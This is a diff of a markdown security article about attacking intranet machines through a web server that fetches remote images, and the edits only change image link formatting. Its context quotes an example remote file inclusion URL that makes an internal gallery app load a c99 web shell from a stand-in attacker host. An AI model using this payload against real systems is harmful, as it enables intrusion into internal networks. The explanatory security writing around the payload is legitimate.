@@ -80,7 +80,7 @@ It is also assumed that the web server can connect to other machines both on the
 
 Understanding the network is an important part of this attack. Many small companies fail to separate the web servers from other internal web servers. This is most commonly seen on DMZs where developers put development machines on the same network as protection machines. They rely on IP filtering at the firewall to insure that no external traffic can connect to the development environment that is meant to be internal. This tactic does, in fact, perform exactly as advertised, however, we will be using only tactics that are within the normal expected behavior of the target website.
 
-[!](http://www.sectheory.com/static/images/intranet-hacking-via-webserver.png)
+[![](http://www.sectheory.com/static/images/intranet-hacking-via-webserver.png)](http://www.sectheory.com/static/images/intranet-hacking-via-webserver.png)
 Fig 1. Click to enlarge
 
 As seen in Fig 1 by telling the target website to connect to websites to pull down an image it is actually instantiating a HTTP connection out. There are very seldom checks put in place to limit this connectivity. In particular the websites aren't limited to non RFC1918 address space - that is they are allowed to connect to the Intranet. Here is an example:
@@ -111,7 +111,7 @@ Because HTTP is stateless, and not particularly good at insuring that the reques
 
 > [http://192.168.0.11/modules/My_eGallery/index.php?basepath=http://www.badguy.com/c99.txt](http://192.168.0.11/modules/My_eGallery/index.php?basepath=http://www.badguy.com/c99.txt)
 
-[!](http://www.sectheory.com/static/images/upload.png)
+[![](http://www.sectheory.com/static/images/upload.png)](http://www.sectheory.com/static/images/upload.png)
 Fig 2. Click to Enlarge
 
 The goal is to discover and exploit a vulnerability on an internal device, and to get that vulnerability to connect back out to the web. Very often firewalls are not properlly configured to disallow this sort of access, which makes upgrading, and downloading easier, but also constitutes a greater risk of exploitation. Using an attack library of commonly used internal applications and their exploits could dramatically increase the likelihood of exploitation. You can see an example of this in Fig 2.
